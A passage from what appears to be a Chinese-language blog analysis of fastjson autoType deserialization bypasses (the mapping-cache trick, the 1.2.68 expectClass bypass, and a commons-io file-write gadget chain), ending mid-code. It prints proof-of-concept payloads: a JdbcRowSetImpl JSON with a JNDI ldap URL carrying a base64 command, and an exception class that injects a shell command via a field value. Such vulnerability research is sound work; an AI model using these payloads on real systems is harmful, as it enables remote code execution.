Feature.SupportAutoType.mask;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">autoTypeSupport</span> <span class="operator">=</span> <span class="built_in">this</span>.autoTypeSupport</span><br><span class="line">                || (features &amp; mask) != <span class="number">0</span></span><br><span class="line">                || (JSON.DEFAULT_PARSER_FEATURE &amp; mask) != <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">在checkAutoType方法的代码中可以发现存在一个逻辑问题，即autoTypeSupport为true时，fastjson也会禁止一些黑名单的类反序列化，但是有一个判断条件：当反序列化的类在黑名单中，且TypeUtils.mappings中没有该类的缓存时，才会抛出异常，就是这个逻辑导致了fastjson 1.2.32之前的版本将会受到autoTypeSupport的影响。</font></p><p><font style="color:#000000;">在autoTypeSupport为默认的false时，程序直接检查黑名单并抛出异常，这部分无法绕过。在这之前，程序会先在TypeUtils.mappings中和deserializers中尝试查找要反序列化的类，如果找到了，则就会return。</font><strong><font style="color:#000000;">因此，如果在mapping中缓存有待加载的恶意类，那么就可以绕过后autoTypeSupport为默认的false时的黑白名单检测。</font></strong></p><p><font style="color:#000000;">跟进一下TypeUtils#getClassFromMapping方法，其从mapping中获取类名，能向mapping中赋值的方法有TypeUtils#addBaseClassMappings和TypeUtils#loadClass。</font></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734945627762-10b00bb7-a1c9-411c-b8fa-b27cdd038807.png"></p><p><font style="color:#000000;">其中，TypeUtils#addBaseClassMappings方法为无参方法，并且没有可控的参数。转向TypeUtils#loadClass方法，这个方法上文也提到了，主要就是在加载类之前对类名做一些检查和判断。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class="type">boolean</span> cache) &#123;</span><br><span class="line">    <span class="comment">// 非空判断</span></span><br><span class="line">    <span class="keyword">if</span>(className == <span class="literal">null</span> || className.length() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 防止重复添加</span></span><br><span class="line">    Class&lt;?&gt; clazz = mappings.get(className);</span><br><span class="line">    <span class="keyword">if</span>(clazz != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 判断 className 是否以 [ 开头</span></span><br><span class="line">    <span class="keyword">if</span>(className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>)&#123;</span><br><span class="line">        Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">        <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 判断 className 是否 L 开头 ; 结尾</span></span><br><span class="line">    <span class="keyword">if</span>(className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>))&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">newClassName</span> <span class="operator">=</span> className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="comment">// 如果 classLoader 非空，cache 为 true 则使用该类加载器加载并存入 mappings 中</span></span><br><span class="line">        <span class="keyword">if</span>(classLoader != <span class="literal">null</span>)&#123;</span><br><span class="line">            clazz = classLoader.loadClass(className);</span><br><span class="line">            <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                mappings.put(className, clazz);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果失败，或没有指定 ClassLoader ，则使用当前线程的 contextClassLoader 来加载类，也需要 cache 为 true 才能写入 mappings 中</span></span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="keyword">if</span>(contextClassLoader != <span class="literal">null</span> &amp;&amp; contextClassLoader != classLoader)&#123;</span><br><span class="line">            clazz = contextClassLoader.loadClass(className);</span><br><span class="line">            <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                mappings.put(className, clazz);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果还是失败，则使用 Class.forName 来获取 class 对象并放入 mappings 中</span></span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        clazz = Class.forName(className);</span><br><span class="line">        mappings.put(className, clazz);</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">在loadClass(String className, ClassLoader classLoader, boolean cache)方法中有三个地方能够向mapping写入恶意类，其被loadClass(String className, ClassLoader classLoader)方法调用，并且该方法中cache默认为true。</font></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734946177191-de2df3bb-e347-44c1-8a80-c5b82871699c.png"></p><p><font style="color:#000000;">继续跟进，发现被com.alibaba.fastjson.serializer.MiscCodec#deserialze方法调用。</font></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734946529587-cfc2b592-0a18-489a-9f81-964d7cfe39b5.png"></p><p><font style="color:#000000;">当parser.resolveStatus为TypeNameRedirect时，会进入if语句，解析val中的内容放入objVal中，然后传入strVal中。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (parser.resolveStatus == DefaultJSONParser.TypeNameRedirect) &#123;</span><br><span class="line">    parser.resolveStatus = DefaultJSONParser.NONE;</span><br><span class="line">    parser.accept(JSONToken.COMMA);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="string">&quot;val&quot;</span>.equals(lexer.stringVal())) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;syntax error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        lexer.nextToken();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;syntax error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    parser.accept(JSONToken.COLON);</span><br><span class="line">    objVal = parser.parse();</span><br><span class="line">    parser.accept(JSONToken.RBRACE);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    objVal = parser.parse();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">String strVal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (objVal == <span class="literal">null</span>) &#123;</span><br><span class="line">    strVal = <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (objVal <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">    strVal = (String) objVal;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">接着当class是Class.class时，将会调用loadClass方法，将strVal进行类加载并缓存。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz == Locale.class) &#123;</span><br><span class="line">    <span class="keyword">return</span> (T) TypeUtils.toLocale(strVal);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;1&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="string">&quot;val&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;2&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>: <span class="string">&quot;ldap://127.0.0.1:1389/Basic/Command/Base64/L2Jpbi9zaCAtYyAnb3BlbiAtYSBDYWxjdWxhdG9yJw==&quot;</span>,</span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">调试分析一下，第一次进入checkAutoType方法时，还没有加入mapping，由于deserializers在初始化时已经将Class.class进行了加载，因此使用findClass方法可以找到，绕过了后面AutoTypeSupport的检查。</font></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734947418766-c2a9691d-adf6-4d4b-a480-948ac04dfe10.png"></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734948910241-e17c27a1-7825-4dd1-8261-48a808d0ecdc.png"></p><p><font style="color:#000000;">接着调用com.alibaba.fastjson.serializer.MiscCodec#deserialze方法，解析json中val中的内容，并放入objVal中，然后调用TypeUtils#loadClass方法，将恶意类进行缓存。</font></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734949131722-9d7395da-0bc0-4e85-9539-e1a59ec35b28.png"></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734949291874-cfd88bd5-5ab3-4c27-83d8-cc980d49daa3.png"></p><p><font style="color:#000000;">后续以恶意类进行@type请求时，由于mapping中已经缓存了，即可绕过黑名单进行的阻拦。</font></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734949618443-a02004be-efee-43ee-b4cd-7e624f30d6b3.png"></p><h3 id="fastjson-1-2-68"><a href="#fastjson-1-2-68" class="headerlink" title="fastjson-1.2.68"></a>fastjson-1.2.68</h3><blockquote><p><font style="color:#000000;">fastjson &lt;&#x3D; 1.2.68，官方在1.2.48对漏洞进行了修复，在MiscCodec处理Class类的地方，设置了cache为false，并且loadClass重载方法的默认的调用改为不缓存，这就避免了使用了Class提前将恶意类名缓存进去。在fastjson 1.2.68中利用expectClass绕过checkAutoType方法，实际上也是为了绕过安全检查的思路的延伸，主要使用Throwable和AutoCloseable进行绕过。</font></p></blockquote><p><font style="color:#000000;">在fastjson 1.2.68中更新了一个新的安全控制点safeMode，如果应用程序开启了safeMode，将在checkAutoType方法中直接抛出异常，也就是完全禁止autoType。</font></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734951327786-d2fd31f4-55ba-48ce-9d5e-c2e2a033a599.png"></p><p><font style="color:#000000;">但与此同时，该版本出现了一个新的autoType绕过方式，利用expectClass绕过checkAutoType方法的安全检查。</font></p><p><font style="color:#000000;">在checkAutoType方法中有如下逻辑，</font><strong><font style="color:#000000;">如果函数有expectClass入参，且传入的类名是expectClass的子类或实现，并且不在黑名单中</font></strong><font style="color:#000000;">，就可以通过checkAutoType方法的安全检查。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (expectClass != <span class="literal">null</span></span><br><span class="line">            &amp;&amp; clazz != java.util.HashMap.class</span><br><span class="line">            &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">查找是否有可控的expectClass入参的方法调用checkAutoType方法，最终找到了以下几个符合的方法：</font></p><ol><li><font style="color:#000000;">ThrowableDeserializer#deserialze</font></li><li><font style="color:#000000;">JavaBeanDeserializer#deserialze</font></li></ol><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734969027005-613a6571-46a6-4280-a854-58915b2a2582.png"></p><p><font style="color:#000000;">在ThrowableDeserializer#deserialze方法中，直接将@type后的类传入checkAutoType方法，并且expectClass为Throwable.class。</font></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734969134637-d9f7d7a1-884c-4a18-983a-aff533460cd0.png"></p><p><font style="color:#000000;">通过checkAutoType方法的安全检查后，使用createException方法来创建异常类的实例。</font></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734969263876-d069722f-f4ab-4330-ac02-b0b77796f5b3.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExecException</span> <span class="keyword">extends</span> <span class="title class_">Exception</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String domain;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ExecException</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getDomain</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> domain;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDomain</span><span class="params">(String domain)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.domain = domain;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMessage</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;ping &quot;</span> + domain&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> e.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc68</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        PocException();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">PocException</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  \&quot;@type\&quot;: \&quot;java.lang.Exception\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  \&quot;@type\&quot;: \&quot;org.example.fastjson.ExecException\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  \&quot;domain\&quot;: \&quot;127.0.0.1 | open -a Calculator\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">与Throwable类似地，还有AutoCloseable，之所以使用AutoCloseable以及其子类可以绕过checkAutoType方法，是因为AutoCloseable是属于fastjson内置的白名单中，其余的调用链一致。</font></p><h4 id="commons-io"><a href="#commons-io" class="headerlink" title="commons-io"></a>commons-io</h4><p><font style="color:#000000;">在fastjson 1.2.68版本的利用中，fastjson在判断期望类之前将继承自ClassLoader、DataSource、RowSet的类直接抛出异常，这也就导致了攻击面大大缩小，对于Gadget的挖掘，浅蓝师傅提出了使用expectClass中的AutoCloseable进行文件读写操作的思路。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) <span class="comment">// classloader is danger</span></span><br><span class="line">        || javax.sql.DataSource.class.isAssignableFrom(clazz) <span class="comment">// dataSource can load jdbc driver</span></span><br><span class="line">        || javax.sql.RowSet.class.isAssignableFrom(clazz) <span class="comment">//</span></span><br><span class="line">        ) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">由于fastjson漏洞触发方式是通过调用get&#x2F;set构造方法来触发漏洞，因此对于写文件类的操作，根据浅蓝师傅的文章，需要满足以下几个条件：</font></p><ol><li><font style="color:#000000;">需要一个通过set方法或构造方法指定文件路径的OutputStream</font></li><li><font style="color:#000000;">需要一个通过set方法或构造方法传入字节数据的OutputStream，参数类型必须是byte[]、ByteBuffer、String、char[]其中的一个，并且可以通过set方法或构造方法传入一个OutputStream，最后可以通过write方法将传入的字节码write到传入的OutputStream</font></li><li><font style="color:#000000;">需要一个通过set方法或构造方法传入一个OutputStream，并且可以通过调用toString、hashCode、get、set、构造方法调用传入的OutputStream的close、write或flush方法</font></li></ol><h5 id="CharSequenceInputStream"><a href="#CharSequenceInputStream" class="headerlink" title="CharSequenceInputStream"></a><font style="color:#000000;">CharSequenceInputStream</font></h5><p><font style="color:#000000;">org.apache.commons.io.input.CharSequenceInputStream类是InputStream的子类，用于接收CharSequence内容并初始化，其构造方法接收参数CharSequence对象、字符编码、字节大小，并初始化放在类属性中。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">CharSequenceInputStream</span><span class="params">(<span class="keyword">final</span> CharSequence cs, <span class="keyword">final</span> Charset charset, <span class="keyword">final</span> <span class="type">int</span> bufferSize)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    <span class="built_in">this</span>.encoder = charset.newEncoder()</span><br><span class="line">        .onMalformedInput(CodingErrorAction.REPLACE)</span><br><span class="line">        .onUnmappableCharacter(CodingErrorAction.REPLACE);</span><br><span class="line">    <span class="comment">// Ensure that buffer is long enough to hold a complete character</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">float</span> <span class="variable">maxBytesPerChar</span> <span class="operator">=</span> encoder.maxBytesPerChar();</span><br><span class="line">    <span class="keyword">if</span> (bufferSize &lt; maxBytesPerChar) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Buffer size &quot;</span> + bufferSize + <span class="string">&quot; is less than maxBytesPerChar &quot;</span> + maxBytesPerChar);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">this</span>.bbuf = ByteBuffer.allocate(bufferSize);</span><br><span class="line">    <span class="built_in">this</span>.bbuf.flip();</span><br><span class="line">    <span class="built_in">this</span>.cbuf = CharBuffer.wrap(cs);</span><br><span class="line">    <span class="built_in">this</span>.mark_cbuf = NO_MARK;</span><br><span class="line">    <span class="built_in">this</span>.mark_bbuf = NO_MARK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">CharSequence是String的父接口，因此可以直接使用String对象的数据。由于这个CharSequenceInputStream类接收CharSequence对象，可以充当写入文件内容的入口类，写入的内容会放在this.cbuf中，这是一个CharBuffer对象。</font></p><h5 id="FileWriterWithEncoding"><a href="#FileWriterWithEncoding" class="headerlink" title="FileWriterWithEncoding"></a>FileWriterWithEncoding</h5><p><font style="color:#000000;">org.apache.commons.io.output.FileWriterWithEncoding类的构造方法接收file参数、encoding参数，创建File对象，并调用initWriter方法初始化OutputStreamWriter方法放在this.out中。</font></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735020524736-d1090dc7-9294-4473-a759-5a7b82cf9d81.png"></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735020496731-440bac7b-743c-4692-834c-aa7f9baa3095.png"></p><h5 id="WriterOutputStream"><a href="#WriterOutputStream" class="headerlink" title="WriterOutputStream"></a>WriterOutputStream</h5><p><font style="color:#000000;">org.apache.commons.io.output.WriterOutputStream类的构造方法接收参数Writer（writer）、字符编码（charsetName）、字节大小（bufferSize）、标识是否立即写入的布尔型参数（writeImmediately）。</font></p><p><font style="color:#000000;">由于CharsetDecoder是一个抽象类，也没有继承AutoCloseable接口，所以无法使用AutoType进行创建，只能使用带有charsetName的构造方法创建。</font></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735020960453-f372314f-4aa5-4895-9809-6bf62932009d.png"></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735020696891-11c76363-796b-4b25-9de9-d42604829339.png"></p><p><font style="color:#000000;">WriterOutputStream#write方法，会将接受到的byte数组通过this.decoderIn的put方法写入，使用this.processInput方法将in和out数据进行拷贝，并在this.flushOutput方法中调用writer的write方法写出this.decoderOut中的数据。</font></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735020803959-2574b6f3-1cbf-4405-8380-86059951e861.png"></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735020860923-f424285d-900d-4762-882a-0c9e70d7858f.png"></p><h5 id="TeeInputStream"><a href="#TeeInputStream" class="headerlink" title="TeeInputStream"></a>TeeInputStream</h5><p><font style="color:#000000;">现在有了接收输入（文件内容）的InputStream，负责输出的OutputStream和Writer（文件路径），接下来还需要找到将InputStream和OutputStream进行转换，以及触发写出文件操作。</font></p><p><font style="color:#000000;">org.apache.commons.io.input.TeeInputStream类的构造方法会接收InputStream及OutputStream，并提供将InputStream中的字节写入OutputStream的功能，以及提供调用两者close的功能。</font></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735021139457-0281377f-2dc7-4079-8d90-f64d9ef413ac.png"></p><p><font style="color:#000000;">TeeInputStream是FilterInputStream的子类，会在构造方法中会把InputStream放在this.in中。</font></p><p><font style="color:#000000;">TeeInputStream#read方法会调用其父类ProxyInputStream的read方法来读取this.in中的内容，并调用this.branch中的OutputStream对象的write方法进行写入。</font></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735021286861-8675dc87-87f7-43ff-aae3-8ebd358563c2.png"></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735021315795-b309fd92-4995-40a1-889c-09d9eb97d55b.png"></p><h5 id="BOMInputStream"><a href="#BOMInputStream" class="headerlink" title="BOMInputStream"></a>BOMInputStream</h5><p><font style="color:#000000;">org.apache.commons.io.input.BOMInputStream类会调用InputStream#read方法读取字节，其是commons-io用来检测文件输入流的BOM，并在输入流中进行过滤，根据org.apache.commons.io.ByteOrderMark中的属性，BOMInputStream支持识别以下几种BOM。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** UTF-8 BOM */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">ByteOrderMark</span> <span class="variable">UTF_8</span>    <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteOrderMark</span>(<span class="string">&quot;UTF-8&quot;</span>,    <span class="number">0xEF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** UTF-16BE BOM (Big-Endian) */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">ByteOrderMark</span> <span class="variable">UTF_16BE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 